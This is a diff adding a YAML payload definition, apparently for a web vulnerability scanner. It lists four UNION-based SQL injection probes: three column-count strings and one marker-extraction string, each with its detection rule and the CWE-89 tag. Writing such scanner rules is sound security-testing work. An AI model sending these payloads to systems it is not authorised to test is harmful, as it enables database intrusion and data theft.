@@ -1,0 +1,33 @@
+id: sqli-union
+name: SQL injection — UNION-based
+context:
+  any: true
+
+payloads:
+  - value: "1 UNION SELECT NULL--"
+    detect: { status_change: true }
+    id: sqli-union-01
+    title: "SQL injection — UNION column count probe (1)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1 UNION SELECT NULL,NULL,NULL--"
+    detect: { status_change: true }
+    id: sqli-union-02
+    title: "SQL injection — UNION column count probe (3)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "1 UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+    detect: { status_change: true }
+    id: sqli-union-03
+    title: "SQL injection — UNION column count probe (5)"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "0 UNION ALL SELECT CONCAT(0x71,0x6b,0x71),NULL,NULL--"
+    detect: { body_contains: "qkq" }
+    id: sqli-union-04
+    title: "SQL injection — UNION data exfiltration marker"
+    severity: critical
+    cwe: CWE-89
